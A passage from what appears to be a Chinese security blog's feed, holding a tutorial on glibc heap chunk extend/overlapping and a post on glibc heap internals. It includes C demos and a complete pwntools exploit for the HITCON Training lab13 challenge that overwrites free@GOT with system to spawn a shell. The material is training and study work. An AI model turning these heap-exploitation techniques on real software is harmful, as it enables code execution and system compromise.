class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000091 &lt;&#x3D;&#x3D;&#x3D; 进入unsorted bin</span><br><span class="line">0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b78</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602040:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602050:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602060:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602070:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602080:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602090:   0x0000000000000090  0x0000000000000020 &lt;&#x3D;&#x3D;&#x3D; chunk 2</span><br><span class="line">0x6020a0:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x6020b0:   0x0000000000000000  0x0000000000020f51 &lt;&#x3D;&#x3D;&#x3D; top chunk</span><br></pre></td></tr></table></figure></div><p>首先释放 chunk1 使它进入 unsorted bin 中，然后篡改 chunk1 的 size 域，此时再进行 malloc 分配就可以得到 chunk1+chunk2 的堆块，从而控制了 chunk2 的内容。</p><h2 id="通过-extend-后向-overlapping"><a href="#通过-extend-后向-overlapping" class="headerlink" title="通过 extend 后向 overlapping"></a>通过 extend 后向 overlapping</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第1个 0x80 的chunk1</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第2个 0x10 的chunk2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第3个 0x10 的chunk3</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第4个 0x10 的chunk4    </span></span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">int</span>)ptr<span class="number">-0x8</span>)=<span class="number">0x61</span>;</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>malloc(0x10)申请的都是fastbin。</p><p>在 malloc(0x50) 对 extend 区域重新占位后，其中 0x10 的 fastbin 块依然可以正常的分配和释放，此时已经构成 overlapping，通过对 overlapping 的进行操作可以实现 fastbin attack。</p><h2 id="通过-extend-前向-overlapping"><a href="#通过-extend-前向-overlapping" class="headerlink" title="通过 extend 前向 overlapping"></a>通过 extend 前向 overlapping</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr1,*ptr2,*ptr3,*ptr4;</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">128</span>);<span class="comment">//smallbin1</span></span><br><span class="line">    ptr2=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//fastbin1</span></span><br><span class="line">    ptr3=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//fastbin2</span></span><br><span class="line">    ptr4=<span class="built_in">malloc</span>(<span class="number">128</span>);<span class="comment">//smallbin2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//防止与top合并</span></span><br><span class="line">    <span class="built_in">free</span>(ptr1);</span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr4<span class="number">-0x8</span>)=<span class="number">0x90</span>;<span class="comment">//修改pre_inuse域</span></span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr4<span class="number">-0x10</span>)=<span class="number">0xd0</span>;<span class="comment">//修改pre_size域</span></span><br><span class="line">    <span class="built_in">free</span>(ptr4);<span class="comment">//unlink进行前向extend</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x150</span>);<span class="comment">//占位块</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>前向 extend 利用了 smallbin 的 unlink 机制，通过修改 pre_size 域可以跨越多个 chunk 进行合并实现 overlapping。</p><h2 id="例-HITCON-Trainging-lab13"><a href="#例-HITCON-Trainging-lab13" class="headerlink" title="例 HITCON Trainging lab13"></a>例 HITCON Trainging lab13</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">功能</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"--------------------------------"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"          Heap Creator          "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"--------------------------------"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" 1. Create a Heap               "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" 2. Edit a Heap                 "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" 3. Show a Heap                 "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" 4. Delete a Heap               "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" 5. Exit                        "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"--------------------------------"</span>);</span><br></pre></td></tr></table></figure></div><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">edit_heap</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function">  <span class="title">if</span> <span class="params">( heaparray[v1] )</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Content of heap : "</span>, &amp;buf);</span><br><span class="line">    read_input(*(heaparray[v1] + <span class="number">1</span>), *heaparray[v1] + <span class="number">1L</span>L);   <span class="comment">// off-by-one</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Done !"</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><ol><li>利用 off by one 漏洞覆盖下一个 chunk 的 size 字段，从而构造伪造的 chunk 大小。</li><li>申请伪造的 chunk 大小，从而产生 chunk overlap，进而修改关键指针。</li></ol><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure></div><p>break *0x400D76</p><p>创建两个大小为0x14的堆块，heap命令查看</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;20gx 0x603290</span><br><span class="line">0x603290:0x00000000000000000x0000000000000021  &#x3D;&#x3D;&#x3D;&gt;chunk1</span><br><span class="line">0x6032a0:0x00000000000000140x00000000006032c0  指向</span><br><span class="line">0x6032b0:0x00000000000000000x0000000000000021  &#x3D;&#x3D;&#x3D;&gt;chunk1数据</span><br><span class="line">0x6032c0:0x61616161616161610x6161616161616161  长度0x14</span><br><span class="line">0x6032d0:0x00000000616161610x0000000000000021  &#x3D;&#x3D;&#x3D;&gt;chunk2</span><br><span class="line">0x6032e0:0x00000000000000140x0000000000603300</span><br><span class="line">0x6032f0:0x00000000000000000x0000000000000021  &#x3D;&#x3D;&#x3D;&gt;chunk2数据</span><br><span class="line">0x603300:0x62626262626262620x6262626262626262  长度0x14</span><br><span class="line">0x603310:0x00000000626262620x0000000000020cf1  &#x3D;&#x3D;&#x3D;&gt;top chunk</span><br><span class="line">0x603320:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></div><p>因此堆中保存的结构为</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-----------------------------------------</span><br><span class="line">chunk1 &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt; |  prev_size  |  size  |</span><br><span class="line">                 |  len(data)  |  ptr   |</span><br><span class="line">                 |  prev_size  |  size  |</span><br><span class="line">                 |         data         |</span><br><span class="line">-----------------------------------------</span><br><span class="line">chunk2 &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt; |  prev_size  |  size  |</span><br><span class="line">                 |  len(data)  |  ptr   |</span><br><span class="line">                 |  prev_size  |  size  |</span><br><span class="line">                 |         data         |</span><br><span class="line">-----------------------------------------</span><br></pre></td></tr></table></figure></div><p>可见如果我们数据的长度为0x18，调用edit_heap就可触发off-by-one覆盖下一堆块的prev_size</p><p>一个chunk在被free掉之后存在bins中，其头部含有prev_size和size，但一旦malloc后，这个prev_size就没用了，它只用来记录前一个空闲块的大小。因此如果malloc0x18个字节的话多出8个字节没有对齐，会将这个prev_size也当做data段的部分分配出去，而不是下一个堆了。</p><p>接下来就是利用<strong>通过 extend 后向 overlapping+fastbin</strong>实现利用了</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">create(<span class="number">0x18</span>,<span class="string">'aaaa'</span>)<span class="comment"># chunk0</span></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">'bbbb'</span>)<span class="comment"># chunk1</span></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">'cccc'</span>)<span class="comment"># chunk2</span></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">'/bin/sh'</span>)<span class="comment"># chunk3</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">0x18</span>+<span class="string">'\x81'</span>)<span class="comment"># 0x18,  off-by-one</span></span><br><span class="line">delete(<span class="number">1</span>)             <span class="comment"># 通过 extend 后向 overlapping</span></span><br><span class="line">size = <span class="string">'\x08'</span>.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload = <span class="string">'d'</span>*<span class="number">0x40</span>+ size + p64(elf.got[<span class="string">'free'</span>])<span class="comment">#这里的size涉及到后面修改地址时需要多长的字节</span></span><br><span class="line">create(<span class="number">0x70</span>,payload) <span class="comment">#重新创建chunk</span></span><br><span class="line"> </span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Content : '</span>)</span><br><span class="line">free_addr = u64(cn.recvuntil(<span class="string">'Done'</span>)[:<span class="number">-5</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))  <span class="comment"># free_got地址</span></span><br><span class="line">success(<span class="string">'free_addr = '</span>+str(hex(free_addr)))</span><br><span class="line"></span><br><span class="line">system_addr = free_addr + lib.symbols[<span class="string">'system'</span>]-lib.symbols[<span class="string">'free'</span>]  <span class="comment"># system地址</span></span><br><span class="line">success(<span class="string">'system_addr = '</span>+str(hex(system_addr)))</span><br><span class="line"> </span><br><span class="line">edit(<span class="number">2</span>,p64(system_addr)) <span class="comment"># 写入</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)  <span class="comment"># free执行</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">cn = process(<span class="string">'./heapcreator'</span>)</span><br><span class="line">elf=ELF(<span class="string">'./heapcreator'</span>)</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">lib = ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(l,value)</span>:</span></span><br><span class="line">    cn.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    cn.sendline(<span class="string">'1'</span>)</span><br><span class="line">    cn.recvuntil(<span class="string">'Size of Heap : '</span>)</span><br><span class="line">    cn.sendline(str(int(l)))</span><br><span class="line">    cn.recvuntil(<span class="string">'Content of heap:'</span>)</span><br><span class="line">    cn.sendline(value)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,value)</span>:</span></span><br><span class="line">    cn.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    cn.sendline(<span class="string">'2'</span>)</span><br><span class="line">    cn.recvuntil(<span class="string">'Index :'</span>)</span><br><span class="line">    <span class="comment">#if index == 2:gdb.attach(cn)</span></span><br><span class="line">    cn.sendline(str(index))</span><br><span class="line">    cn.recvuntil(<span class="string">'Content of heap : '</span>)</span><br><span class="line">    cn.sendline(value)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    cn.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    gdb.attach(cn)</span><br><span class="line">    cn.sendline(<span class="string">'3'</span>)</span><br><span class="line">    cn.recvuntil(<span class="string">'Index :'</span>)</span><br><span class="line">    cn.sendline(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    cn.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    cn.sendline(<span class="string">'4'</span>)</span><br><span class="line">    cn.recvuntil(<span class="string">'Index :'</span>)</span><br><span class="line">    cn.sendline(str(index))</span><br><span class="line"><span class="comment">#leak free addr</span></span><br><span class="line">create(<span class="number">0x18</span>,<span class="string">'aaaa'</span>)<span class="comment">#0</span></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">'bbbb'</span>)<span class="comment">#1</span></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">'cccc'</span>)<span class="comment">#2</span></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">'/bin/sh'</span>)<span class="comment">#3</span></span><br><span class="line">gdb.attach(cn)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">0x18</span>+<span class="string">'\x81'</span>)</span><br><span class="line">gdb.attach(cn)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">size = <span class="string">'\x08'</span>.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload = <span class="string">'d'</span>*<span class="number">0x40</span>+ size + p64(elf.got[<span class="string">'free'</span>])</span><br><span class="line">create(<span class="number">0x70</span>,payload)<span class="comment">#1</span></span><br><span class="line"> </span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">cn.recvuntil(<span class="string">'Content : '</span>)</span><br><span class="line">free_addr = u64(cn.recvuntil(<span class="string">'Done'</span>)[:<span class="number">-5</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">success(<span class="string">'free_addr = '</span>+str(hex(free_addr)))</span><br><span class="line"><span class="comment">#trim free_got</span></span><br><span class="line">system_addr = free_addr + lib.symbols[<span class="string">'system'</span>]-lib.symbols[<span class="string">'free'</span>]</span><br><span class="line">success(<span class="string">'system_addr = '</span>+str(hex(system_addr)))</span><br><span class="line"><span class="comment">#gdb.attach(cn)</span></span><br><span class="line">edit(<span class="number">2</span>,p64(system_addr))</span><br><span class="line"><span class="comment">#gdb.attach(cn)</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;堆溢出-Chunk-Extend-and-Overlapping&quot;&gt;&lt;a href=&quot;#堆溢出-Chunk-Extend-and-Overlapping&quot; class=&quot;headerlink&quot; title=&quot;堆溢出-Chunk Extend and</summary>
        
      
    
    
    
    <category term="Pwn" scheme="https://kabeor.github.io/categories/Pwn/"/>
    
    
    <category term="Pwn" scheme="https://kabeor.github.io/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>堆溢出-Glibc堆结构</title>
    <link href="https://kabeor.github.io/%E5%A0%86%E6%BA%A2%E5%87%BA-Glibc%E5%A0%86%E7%BB%93%E6%9E%84/"/>
    <id>https://kabeor.github.io/%E5%A0%86%E6%BA%A2%E5%87%BA-Glibc%E5%A0%86%E7%BB%93%E6%9E%84/</id>
    <published>2020-01-02T16:00:00.000Z</published>
    <updated>2020-03-16T04:29:33.532Z</updated>
    
    <content type="html"><![CDATA[<h1 id="堆溢出-Glibc堆结构"><a href="#堆溢出-Glibc堆结构" class="headerlink" title="堆溢出-Glibc堆结构"></a>堆溢出-Glibc堆结构</h1><p>目前堆实现有如下几种</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dlmalloc  – General purpose allocator</span><br><span class="line">ptmalloc2 – glibc</span><br><span class="line">jemalloc  – FreeBSD and Firefox</span><br><span class="line">tcmalloc  – Google</span><br><span class="line">libumem   – Solaris</span><br></pre></td></tr></table></figure></div><p>本来linux默认的是dlmalloc，但是由于其不支持多线程堆管理，所以后来被支持多线程的prmalloc2代替了。</p><p>事实上在linux平台，*malloc本质上都是通过系统调用brk或者mmap实现的。</p><p><a href="https://i.loli.net/2020/01/02/YK3BIow1uPDQgAf.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2020/01/02/YK3BIow1uPDQgAf.png" class="lazyload"></a></p><p>在 glibc-2.3.x. 之后，glibc 中集成了 ptmalloc2。</p><blockquote><p>在内存分配与使用的过程中，Linux 有这样的一个基本内存管理思想，<strong>只有当真正访问一个地址的时候，系统才会建立虚拟页面与物理页面的映射关系</strong>。 所以虽然操作系统已经给程序分配了很大的一块内存，但是这块内存其实只是虚拟内存。只有当用户使用到相应的内存时，系统才会真正分配物理页面给用户使用。</p></blockquote><p>内存结构如下</p><p><a href="https://i.loli.net/2020/01/02/IlP5E4GsKwoMuxJ.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2020/01/02/IlP5E4GsKwoMuxJ.png" class="lazyload"></a></p><h2 id="常见堆操作"><a href="#常见堆操作" class="headerlink" title="常见堆操作"></a>常见堆操作</h2><h3 id="malloc-size-t-n"><a href="#malloc-size-t-n" class="headerlink" title="malloc(size_t n)"></a>malloc(size_t n)</h3><p>malloc 函数返回对应大小字节的内存块的指针。</p><ul><li>当 n=0 时，返回当前系统允许的堆的最小内存块。</li><li>当 n 为负数时，由于在大多数系统上，<strong>size_t 是无符号数（这一点非常重要）</strong>，所以程序就会申请很大的内存空间，但通常来说都会失败，因为系统没有那么多的内存可以分配。</li></ul><h3 id="free-void-p"><a href="#free-void-p" class="headerlink" title="free(void* p)"></a>free(void* p)</h3><p>释放由 p 所指向的内存块。这个内存块有可能是通过 malloc 函数得到的，也有可能是通过相关的函数 realloc 得到的。</p><ul><li><strong>当 p 为空指针时，函数不执行任何操作。</strong></li><li>当 p 已经被释放之后，再次释放会出现乱七八糟的效果，这其实就是 <code>double free</code>。</li><li>除了被禁用 (mallopt) 的情况下，当释放很大的内存空间时，程序会将这些内存空间还给系统，以便于减小程序所使用的内存空间。</li></ul><h3 id="s-brk"><a href="#s-brk" class="headerlink" title="(s)brk"></a>(s)brk</h3><p>对于堆的操作，操作系统提供了 brk 函数，glibc 库提供了 sbrk 函数，我们可以通过增加 brk 的大小来向操作系统申请内存。</p><p>初始时，堆的起始地址 start_brk 以及堆的当前末尾 brk 指向同一地址。根据是否开启 ASLR，两者的具体位置会有所不同</p><ul><li>不开启 ASLR 保护时，start_brk 以及 brk 会指向 data/bss 段的结尾。</li><li>开启 ASLR 保护时，start_brk 以及 brk 也会指向同一位置，只是这个位置是在 data/bss 段结尾后的随机偏移处。</li></ul><h3 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h3><p>malloc 会使用 mmap 来创建独立的匿名映射段。匿名映射的目的主要是可以申请以 0 填充的内存，并且这块内存仅被调用进程所使用。</p><h2 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h2><p>用户释放掉的 chunk 不会马上归还给系统，ptmalloc 会统一管理 heap 和 mmap 映射区域中的空闲的 chunk。当用户再一次请求分配内存时，ptmalloc 分配器会试图在空闲的 chunk 中挑选一块合适的给用户。这样可以避免频繁的系统调用，降低内存分配的开销。</p><p>ptmalloc 采用分箱式方法对空闲的 chunk 进行管理。首先，它会根据空闲的 chunk 的大小以及使用状态将 chunk 初步分为 4 类：fast bins，small bins，large bins，unsorted bin。每类中仍然有更细的划分，相似大小的 chunk 会用双向链表链接起来。也就是说，在每类 bin 的内部仍然会有多个互不相关的链表来保存不同大小的 chunk。</p><p>对于 small bins，large bins，unsorted bin 来说，ptmalloc 将它们维护在同一个数组中。</p><h3 id="Fast-Bin"><a href="#Fast-Bin" class="headerlink" title="Fast Bin"></a>Fast Bin</h3><p>大多数程序经常会申请以及释放一些比较小的内存块。如果将一些较小的 chunk 释放之后发现存在与之相邻的空闲的 chunk 并将它们进行合并，那么当下一次再次申请相应大小的 chunk 时，就需要对 chunk 进行分割，这样就大大降低了堆的利用效率。<strong>因为我们把大部分时间花在了合并、分割以及中间检查的过程中。</strong>因此，ptmalloc 中专门设计了 fast bin，对应的变量就是 malloc state 中的 fastbinsY。</p><p>为了更加高效地利用 fast bin，glibc 采用单向链表对其中的每个 bin 进行组织，并且<strong>每个 bin 采取 LIFO 策略</strong>，最近释放的 chunk 会更早地被分配，所以会更加适合于局部性。也就是说，当用户需要的 chunk 的大小小于 fastbin 的最大大小时， ptmalloc 会首先判断 fastbin 中相应的 bin 中是否有对应大小的空闲块，如果有的话，就会直接从这个 bin 中获取 chunk。如果没有的话，ptmalloc 才会做接下来的一系列操作。</p><h3 id="Small-Bin"><a href="#Small-Bin" class="headerlink" title="Small Bin"></a>Small Bin</h3><p>small bins 中一共有 62 个循环双向链表，每个链表中存储的 chunk 大小都一致。比如对于 32 位系统来说，下标 2 对应的双向链表中存储的 chunk 大小为均为 16 字节。每个链表都有链表头结点，这样可以方便对于链表内部结点的管理。此外，<strong>small bins 中每个 bin 对应的链表采用 FIFO 的规则</strong>，所以同一个链表中先被释放的 chunk 会先被分配出去。</p><h3 id="Large-Bin"><a href="#Large-Bin" class="headerlink" title="Large Bin"></a>Large Bin</h3><p>large bins 中一共包括 63 个 bin，每个 bin 中的 chunk 的大小不一致，而是处于一定区间范围内。此外，这 63 个 bin 被分成了 6 组，每组 bin 中的 chunk 大小之间的公差一致</p><table><thead><tr><th align="left">组</th><th align="left">数量</th><th align="left">公差</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">32</td><td align="left">64B</td></tr><tr><td align="left">2</td><td align="left">16</td><td align="left">512B</td></tr><tr><td align="left">3</td><td align="left">8</td><td align="left">4096B</td></tr><tr><td align="left">4</td><td align="left">4</td><td align="left">32768B</td></tr><tr><td align="left">5</td><td align="left">2</td><td align="left">262144B</td></tr><tr><td align="left">6</td><td align="left">1</td><td align="left">不限制</td></tr></tbody></table><h3 id="Unsorted-Bin"><a href="#Unsorted-Bin" class="headerlink" title="Unsorted Bin"></a>Unsorted Bin</h3><p>unsorted bin 可以视为空闲 chunk 回归其所属 bin 之前的缓冲区。</p><h2 id="堆的基本实现功能"><a href="#堆的基本实现功能" class="headerlink" title="堆的基本实现功能"></a>堆的基本实现功能</h2><h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><p>用来将一个双向链表（只存储空闲的 chunk）中的一个元素取出来。</p><p>基本原理：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">定义三个堆块 A-P-C用双链表连接，现在要取出P</span><br><span class="line"></span><br><span class="line">FD &#x3D; P-&gt;fd;  &#x2F;&#x2F;定义P的前驱</span><br><span class="line">BK &#x3D; P-&gt;bk;  &#x2F;&#x2F;定义P的后继</span><br><span class="line">FD-&gt;bk &#x3D; A; &#x2F;&#x2F;令P的后继节点的前驱为A</span><br><span class="line">BK-&gt;fd &#x3D; C; &#x2F;&#x2F;令P的前驱节点的后继为C</span><br><span class="line"></span><br><span class="line">合并一下其实就是如下关系</span><br><span class="line">P-&gt;fd-&gt;bk &#x3D; A</span><br><span class="line">P-&gt;bk-&gt;fd &#x3D; C</span><br><span class="line"></span><br><span class="line">最后结果</span><br><span class="line">A-C   P取出</span><br></pre></td></tr></table></figure></div><p>unlink可能在以下地方使用：</p><ul><li><p>malloc</p><ul><li>从恰好大小合适的 large bin 中获取 chunk。<ul><li><strong>这里需要注意的是 fastbin 与 small bin 就没有使用 unlink，这就是为什么漏洞会经常出现在它们这里的原因。</strong></li><li>依次遍历处理 unsorted bin 时也没有使用 unlink 。</li></ul></li><li>从比请求的 chunk 所在的 bin 大的 bin 中取 chunk。</li></ul></li><li><p>free</p><ul><li>后向合并，合并物理相邻低地址空闲 chunk。</li><li>前向合并，合并物理相邻高地址空闲 chunk（除了 top chunk）。</li></ul></li><li><p>malloc_consolidate</p><ul><li>后向合并，合并物理相邻低地址空闲 chunk。</li><li>前向合并，合并物理相邻高地址空闲 chunk（除了 top chunk）。</li></ul></li><li><p>realloc</p><ul><li>前向扩展，合并物理相邻高地址空闲 chunk（除了 top chunk）。</li></ul></li></ul><p>unlink操作后，<strong>P 本身的 fd 和 bk 指针并没有发生变化</strong>，有时候可以使用这个方法来泄漏地址</p><ul><li><p>libc 地址</p><ul><li>P 位于双向链表头部，bk 泄漏</li><li>P 位于双向链表尾部，fd 泄漏</li><li>双向链表只包含一个空闲 chunk 时，P 位于双向链表中，fd 和 bk 均可以泄漏</li></ul></li><li><p>泄漏堆地址，双向链表包含多个空闲 chunk</p><ul><li>P 位于双向链表头部，fd 泄漏</li><li>P 位于双向链表中，fd 和 bk 均可以泄漏</li><li>P 位于双向链表尾部，bk 泄漏</li></ul></li><li><p>这里的头部指的是 bin 的 fd 指向的 chunk，即双向链表中最新加入的 chunk。</p></li><li><p>这里的尾部指的是 bin 的 bk 指向的 chunk，即双向链表中最先加入的 chunk。</p></li></ul><h3 id="malloc-printerr"><a href="#malloc-printerr" class="headerlink" title="malloc_printerr"></a>malloc_printerr</h3><p>在 glibc malloc 时检测到错误的时候，会调用 <code>malloc_printerr</code> 函数。<br>       主要会调用 <code>__libc_message</code> 来执行<code>abort</code> 函数。<br>       在<code>abort</code> 函数里，在 glibc 还是 2.23 版本时，会 fflush stream。</p><h3 id="堆初始化"><a href="#堆初始化" class="headerlink" title="堆初始化"></a>堆初始化</h3><p>堆初始化是在用户第一次申请内存时执行 malloc_consolidate 再执行 malloc_init_state 实现的。</p><h3 id="申请内存块"><a href="#申请内存块" class="headerlink" title="申请内存块"></a>申请内存块</h3><p>一般我们会使用 malloc 函数来申请内存块，其实该函数真正调用的是 <strong>libc_malloc 函数。此外，</strong>libc_malloc 函数只是用来简单封装 _int_malloc 函数。_int_malloc 才是申请内存块的核心。</p><p>需要了解的时候查<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/implementation/malloc-zh/" target="_blank" rel="noopener">ctf-wiki</a>就好，释放内存块类似</p>]]></content>
    
    
      
      
        
        
